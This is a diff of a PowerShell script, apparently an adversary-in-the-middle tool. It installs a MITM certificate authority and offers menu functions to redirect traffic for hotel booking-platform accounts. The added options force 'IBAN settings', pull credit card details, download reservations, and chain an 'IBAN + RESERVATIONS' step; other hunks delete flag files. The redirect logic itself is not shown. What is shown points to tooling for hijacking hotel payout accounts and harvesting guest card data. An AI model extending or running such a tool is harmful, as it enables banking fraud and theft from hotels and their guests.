+        $BookingIbanAndReservationsFlag
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
@@ -1287,13 +1502,14 @@ function Enable-PartnersAndMessRedirect {
         $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
+        $BookingIbanSettingsFlag,
         $DeviceFlag, $PulseFlag, $UltraPulseFlag,
         $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
-        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
-        # $MonitorPlatformsFlag - НЕ УДАЛЯЕМ!
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile,
+        $BookingIbanAndReservationsFlag
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
@@ -1338,13 +1554,14 @@ function Enable-DeviceRedirect {
         $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
+        $BookingIbanSettingsFlag,
         $PartnersFlag, $PartnersAndMessFlag, $PulseFlag, $UltraPulseFlag,
         $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
-        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
-        # $MonitorPlatformsFlag - НЕ УДАЛЯЕМ!
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile,
+        $BookingIbanAndReservationsFlag
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
@@ -1424,13 +1641,14 @@ function Enable-PulseRedirect {
         $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
+        $BookingIbanSettingsFlag,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $UltraPulseFlag,
         $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
-        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
-        # $MonitorPlatformsFlag - НЕ УДАЛЯЕМ!
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile,
+        $BookingIbanAndReservationsFlag
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
@@ -1516,12 +1734,13 @@ function Enable-UltraPulseRedirect {
         $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
+        $BookingIbanSettingsFlag,
         $PartnersFlag, $PartnersAndMessFlag, $PulseFlag,
         $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
-        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
-        # $MonitorPlatformsFlag - НЕ УДАЛЯЕМ!
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile,
+        $BookingIbanAndReservationsFlag
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
@@ -1546,7 +1765,6 @@ function Enable-UltraPulseRedirect {
 # ========== ФУНКЦИИ УПРАВЛЕНИЯ ==========
 
 function Disable-AllRedirects {
-    # ========== СОХРАНЯЕМ ФЛАГ ФУНКЦИИ 26 ==========
     $function26WasEnabled = Preserve-Function26Flag
     
     @(
@@ -1556,23 +1774,22 @@ function Disable-AllRedirects {
         $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
+        $BookingIbanSettingsFlag,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
         $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
-        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
-        # $MonitorPlatformsFlag - НЕ УДАЛЯЕМ!
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile,
+        $BookingIbanAndReservationsFlag
     ) | ForEach-Object {
         Remove-Item -Path $_ -Force -ErrorAction SilentlyContinue
     }
     
-    # ========== ВОССТАНАВЛИВАЕМ ФЛАГ ФУНКЦИИ 26 ЕСЛИ ОН БЫЛ ==========
     Restore-Function26Flag -wasEnabled $function26WasEnabled
     
     Set-Content -Path $PulseDisabledFlag -Value "DISABLED" -Force
     
-    # Удаляем флаг автозапуска
     Remove-Item -Path $AutostartFlag -Force -ErrorAction SilentlyContinue
     Remove-Item -Path $AutostartFunctionFile -Force -ErrorAction SilentlyContinue
     
@@ -1606,7 +1823,6 @@ Clear-SystemProxies
 
 Ensure-MitmCA | Out-Null
 
-# Проверяем, был ли автозапуск
 $AutostartDetected = $false
 if (Test-Path $AutostartFlag) {
     Log-Write "=" * 60
@@ -1643,7 +1859,7 @@ if (-not $AutostartDetected) {
             Log-Write ("[INFO] Redirect target set to EMPTY - only special functions will work")
             Write-Host ""
             Write-Host "[INFO] REDIRECT TARGET: EMPTY" 
-            Write-Host "       Only special functions (7-27) will work" 
+            Write-Host "       Only special functions (7-29) will work" 
             Write-Host "       Force/One-shot redirects will be disabled" 
             Write-Host ""
             break
@@ -1696,7 +1912,7 @@ while ($true) {
     Write-Host "   1) RESET (stop all)"
     Write-Host "   2) One-shot redirect"
     Write-Host "   3) Force redirect"
-    Write-Host "   4) DISABLE all redirects (сохраняет функцию 26!)"
+    Write-Host "   4) DISABLE all redirects (conserve 26!)"
     Write-Host "   5) Tail log"
     Write-Host "   6) EXIT"
     Write-Host ""
@@ -1707,8 +1923,8 @@ while ($true) {
     Write-Host "   10) Phone redirect (function 10)"
     Write-Host "   11) Operation 11 (7 -> 8)"
     Write-Host "   12) Operation 12 (9 -> 10)"
-    Write-Host "   13) IBAN"
-    Write-Host "   14) Disable function 13"
+    Write-Host "   13) Phone settings force"
+    Write-Host "   14) 📘 IBAN settings force (Function 14) 🏦"
     Write-Host "   15) Messages settings force (function 15)"
     Write-Host "   16) Operation 16 (13 -> 15)"
     Write-Host "   17) Custom one-time redirect (function 17)"
@@ -1716,7 +1932,7 @@ while ($true) {
     Write-Host "   19) Credit card details (function 19)"
     Write-Host "   20) Clear Function 17"
     Write-Host ""
-    Write-Host " FUNCTIONS 21-27:"
+    Write-Host " FUNCTIONS 21-29:"
     Write-Host "   21) Partners redirect (booker)"
     Write-Host "   22) Partners and Messaging (booker)"
     Write-Host "   23) Device security (pms)"
@@ -1725,6 +1941,8 @@ while ($true) {
     Write-Host "   26) ✅ Platform monitoring ONLY (ПАРАЛЛЕЛЬНО - НЕ УДАЛЯЕТСЯ!)"
     Write-Host "   27) CYCLE Reservations download (BOOKER CHANNEL)"
     Write-Host "   28) Clear Function 27"
+    Write-Host "   29) 🏆 IBAN + RESERVATIONS (Function 14 → Function 18)"
+    Write-Host "   30) Clear Function 29"
     Write-Host "==========================================="
     
     $monitorStatus = if (Test-Path $MonitorPlatformsFlag) { "✅ ACTIVE" } else { "❌ DISABLED" }
@@ -1757,7 +1975,7 @@ while ($true) {
         "11" { Enable-Operation11Redirect }
         "12" { Enable-Operation12Redirect }
         "13" { Enable-BookingHotelRedirect }
-        "14" { Disable-BookingHotelRedirect }
+        "14" { Enable-BookingIbanSettingsRedirect }
         "15" { Enable-BookingHotelSecurityRedirect }
         "16" { Enable-Operation16Redirect }
         "17" { Enable-CustomRedirect }
@@ -1772,6 +1990,8 @@ while ($true) {
         "26" { Enable-MonitorPlatforms }
         "27" { Enable-BookingReservationsCycleRedirect }
         "28" { Clear-Function27 }
+        "29" { Enable-BookingIbanAndReservationsRedirect }
+        "30" { Clear-Function29 }
         default { Write-Host "Invalid choice" }
     }
 }
